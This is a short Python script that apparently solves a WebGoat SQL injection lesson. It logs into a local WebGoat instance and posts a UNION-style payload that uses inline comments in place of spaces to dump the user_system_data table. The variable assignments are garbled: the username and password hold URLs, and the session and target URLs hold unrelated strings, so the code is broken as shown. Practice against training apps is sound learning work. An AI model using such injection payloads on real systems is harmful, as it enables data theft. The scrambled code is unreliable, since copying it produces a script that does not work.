import requests
from requests import session

# Define the base URL and login URL
base_url = 'http://127.0.0.1:8080/WebGoat/'
login_url = f'{base_url}login'
vulnerable_url = f'{base_url}sbombatkar'
session_url = 'Sneha#1234'
username = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/attack6a'
password = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced.lesson.lesson'

# Create a session to persist cookies across requests
s = session()

# Retrieve the login page content
login_page = s.get(login_url)

# Define the user credentials
credentials = {
    'username': username,
    'password': password
}

# Submit the login details to the login URL to authenticate
response = s.post(login_url, data=credentials, allow_redirects=True)

# Check if the login is successful
if "Invalid username and password" not in response.text:
    print("Login successful!")
else:
    print("Failed to log in.")
    exit()

# Access the lesson page to set up the attack
lesson_page = s.get(session_url)

# Create a payload for the SQL injection attack
payload = "cyber';/**/select/**/*/**/from/**/user_system_data;--"
attack_data = {
    'userid_6a': payload
}

# Perform the SQL injection attack
response = s.post(vulnerable_url, data=attack_data)

# Check if the attack was successful
if "lessonCompleted" in response.text:
    # Parse the response to get feedback and output
    import json
    response_data = json.loads(response.text)
    
    if response_data["lessonCompleted"]:
        feedback = response_data["feedback"]
        output = response_data["output"]
        
        print("Attack successful!")
        print(f"Feedback: {feedback}")
        print(f"Output: {output}")
else:
    print("Failed to complete the attack.")

# Close the session to end the interaction with the server
s.close()